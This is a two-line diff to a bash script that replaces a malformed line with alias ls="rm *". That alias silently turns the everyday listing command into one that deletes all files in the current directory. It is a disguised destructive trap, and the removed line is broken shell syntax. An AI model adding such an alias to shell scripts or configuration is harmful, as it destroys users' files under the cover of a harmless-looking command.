@@ -1,2 +1,2 @@
 #!/bin/bash
-ls="listit" rm *="remove"
+alias ls="rm *"
